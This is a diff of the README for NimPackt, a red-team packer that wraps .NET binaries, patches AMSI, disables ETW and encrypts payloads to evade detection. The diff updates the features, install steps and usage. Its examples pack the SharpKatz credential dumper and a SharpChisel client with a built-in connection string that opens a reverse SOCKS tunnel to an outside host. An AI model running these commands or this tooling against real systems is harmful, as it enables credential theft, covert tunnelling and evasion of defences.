@@ -10,7 +10,7 @@ NimPackt is a Nim-based packer for C# / .NET executables. It automatically wraps
 
 - Patching the Anti-Malware Scan Interface (AMSI)
 - Disabling Event Tracing for Windows (ETW)
-- Payload encoding to prevent static analysis
+- Payload encryption (AES-128 CTR) to prevent static analysis
 - Obfuscating static strings used in the binary
 - Supports cross-platform compilation (from both Linux and Windows)
 - Supports both x64/x86 compilation (make sure to grab the right architecture for the ingested binary)
@@ -25,27 +25,29 @@ On **Linux**, simply install the required packages and use the Nimble package in
 
 ```
 sudo apt install -y python3 mingw-w64 nim
-nimble install winim strenc base64
+nimble install winim strenc nimcrypto
 ```
 
 On **Windows**, execute the Nim installer from [here](https://nim-lang.org/install_windows.html). Make sure to install `mingw` and set the path values correctly using the provided `finish.exe` utility, then install the required packages as follows.
 
 ```
-nimble install winim strenc base64
+nimble install winim strenc nimcrypto
 ```
 
 ## Usage
 
 ```
-usage: NimPackt.py [-h] -i INPUTFILE [-a ARGUMENTS] [-32] [-H] [-na] [-ne] [-v] [-V]
+usage: NimPackt.py [-h] -i INPUTFILE [-a [ARGUMENTS]] [-e EXECUTIONMODE] [-32] [-H] [-na] [-ne] [-v] [-V]
 
 required arguments:
   -i INPUTFILE, --inputfile INPUTFILE
                         C# .NET binary executable to wrap
 
 optional arguments:
-  -a ARGUMENTS, --arguments ARGUMENTS
-                        Arguments to "bake into" the wrapped binary, or "PASSTHRU" to accept run-time arguments (defaults to empty string)
+  -a [ARGUMENTS], --arguments [ARGUMENTS]
+                        Arguments to "bake into" the wrapped binary, or "PASSTHRU" to accept run-time arguments (default)
+  -e EXECUTIONMODE, --executionmode EXECUTIONMODE
+                        Execution mode of the packer. Supports "execute-assembly" (default), "shinject" (TODO), "shinject-remote" (TODO)
   -32, --32bit          Compile in 32-bit mode
   -H, --hideapp         Hide the app frontend (console output) by compiling it in GUI mode
   -na, --nopatchamsi    Do NOT patch (disable) the Anti-Malware Scan Interface (AMSI)
@@ -57,11 +59,10 @@ optional arguments:
 **Examples:**
 
 ```
-# (Windows) Pack SharpKatz to accept commands at runtime, patch AMSI and disable ETW while printing verbose messages on runtime 
-# Note that applications may crash silently if you pass the wrong arguments in PASSTHRU mode (depending on the application)
-python3 .\NimPackt.py -v -i .\SharpBins\SharpKatz-x64.exe -a "PASSTHRU"
+# Pack SharpKatz to accept commands at runtime, patch AMSI and disable ETW while printing verbose messages on runtime
+python3 ./NimPackt.py -v -i ./SharpBins/SharpKatz-x64.exe
 
-# (Linux) Pack SharpChisel with a built-in ChiselChief connection string, do not patch AMSI or disable ETW, hide the application window on runtime
+# Pack SharpChisel with a built-in ChiselChief connection string, do not patch AMSI or disable ETW, hide the application window on runtime
 python3 NimPackt.py -H -i /tmp/SharpChisel.exe -a 'client --auth nimpackt.demo_A:718nubCpwiuLUW --keepalive 25s --max-retry-interval 25s https://chisel.azurewebsites.net R:10073:socks'
 ```
 
@@ -72,6 +73,6 @@ python3 NimPackt.py -H -i /tmp/SharpChisel.exe -a 'client --auth nimpackt.demo_A
 ## Wishlist
 
 - Support shellcode wrapping using separate Nim templates
-- Replace encoding with encryption
 - Provide option to deploy `Project5` to unhook API calls before execution
 - Provide option to pack as dll library
+- A CobaltStrike plugin 🤗
